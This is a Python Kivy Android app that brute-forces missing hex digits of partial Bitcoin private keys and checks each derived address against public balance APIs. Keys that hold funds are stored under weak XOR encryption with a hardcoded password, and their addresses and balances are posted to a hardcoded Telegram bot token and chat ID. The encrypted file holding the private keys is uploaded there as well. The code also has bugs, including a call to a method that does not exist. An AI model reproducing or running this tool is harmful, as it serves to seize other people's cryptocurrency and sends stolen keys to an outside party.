#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BTC Scanner - 安卓极速版
移除了cryptography依赖，改用纯Python加密，大幅提升打包成功率。
"""

import threading
import time
import random
import json
import hashlib
import base64
import os
import string
import binascii

# 核心加密与网络库
from ecdsa import SigningKey, SECP256k1
import base58
import requests

# Kivy 安卓 GUI 库
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.popup import Popup
from kivy.clock import Clock
from kivy.core.window import Window

# 尝试导入安卓唤醒锁
try:
    from jnius import autoclass
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    PowerManager = autoclass('android.os.PowerManager')
    Context = autoclass('android.content.Context')
    ANDROID_MODE = True
except ImportError:
    ANDROID_MODE = False

# ==============================================================================
# 核心工具类
# ==============================================================================

class TelegramNotifier:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.api_url = f"https://api.telegram.org/bot{self.bot_token}"

    def send_message(self, message):
        try:
            payload = {'chat_id': self.chat_id, 'text': message, 'parse_mode': 'Markdown'}
            requests.post(f"{self.api_url}/sendMessage", data=payload, timeout=10)
        except Exception as e:
            print(f"Telegram Send Failed: {e}")

    def send_document(self, file_path):
        if not os.path.exists(file_path): return
        try:
            with open(file_path, 'rb') as file:
                payload = {'chat_id': self.chat_id, 'caption': f"🔐 备份文件: {os.path.basename(file_path)}"}
                files = {'document': file}
                requests.post(f"{self.api_url}/sendDocument", data=payload, files=files, timeout=30)
        except Exception as e:
            print(f"Telegram Send Doc Failed: {e}")

class Config:
    def __init__(self):
        self.config_file = "btc_config.json"
        self.default_config = {
            "encrypted_file_path": "./BTC_found_keys.txt", 
            "password": "dwafa44f68efs46f48s6fe4fa6s488686w1a6!fa86f46!48fa6s?da4",
            "segments": ["8bd772f", "9bf7", "d64aa3613545aad8be68", "03b1554d8a", "c51", "8f1feff18ce5a15"],
            "missing_chars_count": 5,
            "progress_file": "./btc_progress.txt", 
            "batch_size": 5, "min_wait_time": 1.2, "max_wait_time": 3.0, "api_timeout": 10
        }
        self.config = self.load_config()

    def load_config(self):
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r', encoding='utf-8') as f:
                    return {**self.default_config, **json.load(f)}
            except: pass
        return self.default_config.copy()

    def get(self, key, default=None): return self.config.get(key, default)

class BTCAddressGenerator:
    @staticmethod
    def private_key_to_btc_address(private_key_hex):
        try:
            private_key_bytes = binascii.unhexlify(private_key_hex)
            sk = SigningKey.from_string(private_key_bytes, curve=SECP256k1)
            vk = sk.get_verifying_key()
            public_key_bytes = b'\x02' + vk.to_string()[:32] if vk.to_string()[-1] % 2 == 0 else b'\x03' + vk.to_string()[:32]
            sha256_hash = hashlib.sha256(public_key_bytes).digest()
            ripemd160 = hashlib.new('ripemd160'); ripemd160.update(sha256_hash)
            extended_hash = b'\x00' + ripemd160.digest()
            checksum = hashlib.sha256(hashlib.sha256(extended_hash).digest()).digest()[:4]
            return base58.b58encode(extended_hash + checksum).decode('utf-8')
        except Exception as e:
            return None

# 纯Python实现的简易加密，替代cryptography库，避免打包噩梦
class SimpleCrypto:
    def __init__(self, password):
        self.key = hashlib.sha256(password.encode()).digest()
        
    def encrypt(self, data):
        if isinstance(data, str): data = data.encode('utf-8')
        xored = bytes(a ^ b for a, b in zip(data, (self.key * (len(data) // len(self.key) + 1))[:len(data)]))
        return base64.b64encode(xored).decode('utf-8')
        
    def decrypt(self, data):
        decoded = base64.b64decode(data)
        xored = bytes(a ^ b for a, b in zip(decoded, (self.key * (len(decoded) // len(self.key) + 1))[:len(decoded)]))
        return xored.decode('utf-8')

class EncryptedFileHandler:
    def __init__(self, file_path, password):
        self.file_path = file_path
        self.crypto = SimpleCrypto(password)

    def save_content(self, content):
        try:
            old_content = ""
            if os.path.exists(self.file_path):
                try:
                    with open(self.file_path, 'r', encoding='utf-8') as f: old_content = self.crypto.decrypt(f.read())
                except: pass
            new_content = old_content + content + "\n" + "="*60 + "\n"
            with open(self.file_path, 'w', encoding='utf-8') as f: f.write(self.crypto.encrypt(new_content))
            return True
        except Exception as e:
            print(f"Save Error: {e}")
            return False

    def read_content(self):
        try:
            with open(self.file_path, 'r', encoding='utf-8') as f: return self.crypto.decrypt(f.read())
        except Exception as e: return f"解密失败: {e}"

class ProgressManager:
    def __init__(self, progress_file): self.progress_file = progress_file
    def save_progress(self, value):
        try:
            with open(self.progress_file, 'w') as f: f.write(str(value))
        except: pass
    def load_progress(self):
        try:
            if os.path.exists(self.progress_file):
                with open(self.progress_file, 'r') as f: return int(f.read().strip())
        except: pass
        return 0

class BalanceAPI:
    def __init__(self, timeout=10):
        self.timeout = timeout
        self.providers = [
            ("Blockstream", self._get_balance_blockstream), 
            ("Mempool.space", self._get_balance_mempool),
            ("Blockchain.com", self._get_balance_blockchain), 
            ("BlockCypher", self._get_balance_blockcypher)
        ]
        self.current_provider_idx = 0

    def _http_get(self, url):
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10)"}
            resp = requests.get(url, headers=headers, timeout=self.timeout)
            if resp.ok: return resp.json()
        except: pass
        return None

    def _get_balance_blockstream(self, addr):
        data = self._http_get(f'https://blockstream.info/api/address/{addr}')
        if data and 'chain_stats' in data: return (data['chain_stats'].get('funded_txo_sum', 0) - data['chain_stats'].get('spent_txo_sum', 0)) / (10**8)
    def _get_balance_mempool(self, addr):
        data = self._http_get(f'https://mempool.space/api/address/{addr}')
        if data and 'chain_stats' in data: return (data['chain_stats'].get('funded_txo_sum', 0) - data['chain_stats'].get('spent_txo_sum', 0)) / (10**8)
    def _get_balance_blockchain(self, addr):
        data = self._http_get(f'https://blockchain.info/balance?active={addr}')
        if data and addr in data: return data[addr].get('final_balance', 0) / (10**8)
    def _get_balance_blockcypher(self, addr):
        data = self._http_get(f'https://api.blockcypher.com/v1/btc/main/addrs/{addr}/balance')
        if data and 'balance' in data: return data['balance'] / (10**8)

    def get_balance(self, address, max_retries=3):
        for _ in range(max_retries):
            name, func = self.providers[self.current_provider_idx]
            try:
                balance = func(address)
                if balance is not None: return balance, name
            except: pass
            self.current_provider_idx = (self.current_provider_idx + 1) % len(self.providers)
        return None, "Unknown"

# ==============================================================================
# Kivy 安卓 GUI
# ==============================================================================

class BTCScannerApp(App):
    def build(self):
        self.config = Config()
        self.api = BalanceAPI(timeout=self.config.get('api_timeout', 10))
        self.address_generator = BTCAddressGenerator()
        self.file_handler = EncryptedFileHandler(self.config.get('encrypted_file_path'), self.config.get('password'))
        self.progress_manager = ProgressManager(self.config.get('progress_file'))
        self.telegram_notifier = TelegramNotifier("8501218705:AAEro0n39-o3fyjXG8K2h9oWIB4y7ufjW0s", "8161850218")

        self.running = False
        self.found_count = 0
        self.segments = self.config.get('segments')
        self.missing_chars_count = self.config.get('missing_chars_count')
        self.max_suffix = 16 ** self.missing_chars_count
        self.current_suffix_int = self.progress_manager.load_progress()

        root_layout = BoxLayout(orientation='vertical', padding=10, spacing=5)

        # 顶部状态栏
        top_bar = BoxLayout(size_hint_y=0.08)
        self.status_label = Label(text=f'进度: {(self.current_suffix_int/self.max_suffix)*100:.4f}%', font_size='14sp')
        self.found_label = Label(text=f'发现: {self.found_count}', font_size='14sp')
        top_bar.add_widget(self.status_label)
        top_bar.add_widget(self.found_label)
        root_layout.add_widget(top_bar)

        # 日志区域
        self.log_text = TextInput(text='=== BTC 安卓扫描器启动 ===\n', readonly=True, font_size='12sp', size_hint_y=0.65)
        root_layout.add_widget(self.log_text)

        # 按钮区域
        btn_layout = GridLayout(cols=3, size_hint_y=0.15, spacing=5)
        self.start_btn = Button(text='开始扫描', on_press=self.start_scan)
        self.stop_btn = Button(text='停止扫描', on_press=self.stop_scan, disabled=True)
        btn_layout.add_widget(self.start_btn)
        btn_layout.add_widget(self.stop_btn)
        btn_layout.add_widget(Button(text='查看文件', on_press=self.view_encrypted_file))
        btn_layout.add_widget(Button(text='测试API', on_press=self.test_api))
        btn_layout.add_widget(Button(text='防休眠', on_press=self.acquire_wake_lock))
        btn_layout.add_widget(Button(text='修改私钥段', on_press=self.show_segments_popup))
        root_layout.add_widget(btn_layout)

        # 手动查询区域
        query_layout = BoxLayout(orientation='horizontal', size_hint_y=0.08, spacing=5)
        self.query_input = TextInput(hint_text='输入BTC地址手动查询', multiline=False)
        query_btn = Button(text='查询', size_hint_x=0.3, on_press=self.manual_query)
        query_layout.add_widget(self.query_input)
        query_layout.add_widget(query_btn)
        root_layout.add_widget(query_layout)

        return root_layout

    def log(self, msg):
        Clock.schedule_once(lambda dt: self.log_text.insert_text(f"{msg}\n"))

    def acquire_wake_lock(self, instance=None):
        if ANDROID_MODE:
            try:
                pm = PythonActivity.mActivity.getSystemService(Context.POWER_SERVICE)
                wake_lock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "MyApp:MyWakeLockTag")
                wake_lock.acquire()
                self.log("[系统] 已获取防休眠锁，后台将持续运行")
            except Exception as e:
                self.log(f"[系统] 防休眠锁获取失败: {e}")
        else:
            self.log("[系统] 非安卓环境，无需防休眠锁")

    def test_api(self, instance=None):
        self.log("[测试] 正在查询创世区块地址...")
        threading.Thread(target=self._test_api_worker, daemon=True).start()

    def _test_api_worker(self):
        balance, provider = self.api.get_balance("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
        self.log(f"[测试] {provider} -> 余额: {balance} BTC")

    def generate_private_key(self, index):
        hex_str = format(index, f'0{self.missing_chars_count}x')
        hex_str = hex_str[-self.missing_chars_count:] if len(hex_str) > self.missing_chars_count else hex_str.zfill(self.missing_chars_count)
        return (self.segments[0] + hex_str[0] + self.segments[1] + hex_str[1] + self.segments[2] + hex_str[2] + 
                self.segments[3] + hex_str[3] + self.segments[4] + hex_str[4] + self.segments[5])

    def start_scan(self, instance=None):
        self.running = True
        self.start_btn.disabled = True
        self.stop_btn.disabled = False
        self.log("----开始无限循环扫描----")
        self.telegram_notifier.send_message("🚀 **BTC Scanner (安卓版) 已开始扫描。**")
        threading.Thread(target=self.scan_worker, daemon=True).start()

    def stop_scan(self, instance=None):
        self.running = False
        self.progress_manager.save_progress(self.current_suffix_int)
        self.log("----正在停止，保存进度----")

    def scan_worker(self):
        batch_size = self.config.get('batch_size', 5)
        min_wait, max_wait = self.config.get('min_wait_time', 1.2), self.config.get('max_wait_time', 3.0)
        
        while self.running:
            if self.current_suffix_int >= self.max_suffix:
                self.log("!!! 穷举周期完成，生成新段并重置 !!!")
                self.segments = [''.join(random.choices(string.hexdigits[:-2], k=l)) for l in [7, 4, 20, 10, 3, 15]]
                self.current_suffix_int = 0
                self.progress_manager.save_progress(0)

            count = min(batch_size, self.max_suffix - self.current_suffix_int)
            pks, addrs = [], []
            for i in range(count):
                pk = self.generate_private_key(self.current_suffix_int + i)
                pks.append(pk)
                addrs.append(self.address_generator.private_key_to_btc_address(pk))
            
            self.current_suffix_int += count
            progress = (self.current_suffix_int / self.max_suffix) * 100
            Clock.schedule_once(lambda dt, p=progress: self.status_label.set_text(f'进度: {p:.4f}%'))
            self.progress_manager.save_progress(self.current_suffix_int)
            
            time.sleep(random.uniform(min_wait, max_wait))
            
            for i in range(count):
                if not self.running: break
                if not addrs[i]: continue
                balance, provider = self.api.get_balance(addrs[i])
                if balance is not None:
                    self.log(f"{provider} | {addrs[i]} | {balance} BTC")
                    if balance > 0:
                        self.save_found_key(pks[i], addrs[i], balance)
                else:
                    self.log(f"查询失败，重试中... {addrs[i]}")
        
        Clock.schedule_once(lambda dt: self.start_btn.set_disabled(False))
        Clock.schedule_once(lambda dt: self.stop_btn.set_disabled(True))

    def save_found_key(self, private_key, address, balance):
        content = f"时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n私钥: {private_key}\n地址: {address}\n余额: {balance} BTC\n"
        if self.file_handler.save_content(content):
            self.found_count += 1
            Clock.schedule_once(lambda dt: self.found_label.set_text(f'发现: {self.found_count}'))
            self.telegram_notifier.send_message(f"💰 **发现新资产!**\n地址: `{address}`\n余额: `{balance} BTC`")
            self.telegram_notifier.send_document(self.config.get('encrypted_file_path'))

    def view_encrypted_file(self, instance=None):
        content = self.file_handler.read_content()
        popup = Popup(title='加密文件内容', content=Label(text=content, text_size=(Window.width*0.8, None)), size_hint=(0.9, 0.9))
        popup.open()

    def manual_query(self, instance=None):
        addr = self.query_input.text.strip()
        if addr: threading.Thread(target=self._manual_query_worker, args=(addr,), daemon=True).start()

    def _manual_query_worker(self, addr):
        self.log(f"手动查询: {addr}")
        results = self.api.query_all_apis(addr)
        for name, bal in results:
            self.log(f" - {name}: {bal} BTC")

    def show_segments_popup(self, instance=None):
        content = BoxLayout(orientation='vertical', spacing=5)
        inputs = []
        lengths = [7, 4, 20, 10, 3, 15]
        for i, length in enumerate(lengths):
            box = BoxLayout()
            box.add_widget(Label(text=f'段{i+1}(长{length}):'))
            inp = TextInput(text=self.segments[i], multiline=False)
            box.add_widget(inp)
            inputs.append(inp)
            content.add_widget(box)
        
        def save_segments(instance):
            new_segs = [inp.text.strip().lower() for inp in inputs]
            for i, seg in enumerate(new_segs):
                if len(seg) != lengths[i] or not all(c in string.hexdigits for c in seg):
                    self.log(f"错误: 段{i+1}格式不对")
                    return
            self.segments = new_segs
            self.current_suffix_int = 0
            self.progress_manager.save_progress(0)
            self.log("私钥段已更新，进度已重置")
            popup.dismiss()

        btn = Button(text='保存并重置进度', on_press=save_segments)
        content.add_widget(btn)
        popup = Popup(title='修改私钥段', content=content, size_hint=(0.9, 0.9))
        popup.open()

if __name__ == '__main__':
    BTCScannerApp().run()
